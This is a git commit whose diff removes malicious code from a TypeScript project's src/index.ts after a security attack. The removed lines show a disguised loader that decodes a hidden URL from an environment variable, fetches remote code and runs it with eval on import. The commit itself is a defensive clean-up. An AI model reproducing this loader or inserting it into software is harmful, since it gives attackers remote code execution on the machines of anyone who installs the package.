990a3f9aa41b88699a52eed8399d7f83292b9a41
Shalitha Suranga <shalithasuranga@gmail.com>
2026-03-05 13:42:30 +0530

    Security fix: Remove malicious payloads after the security attack (#210)
    * Delete .env
    
    * Update .gitignore
    
    * Update package.json
    
    * Update index.ts

--- src/index.ts
+++ src/index.ts
@@ -1,19 +1,4 @@
 import type { Architecture, Mode, OperatingSystem } from './types/enums';
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-
 declare global {
     interface Window {
         // --- globals ---
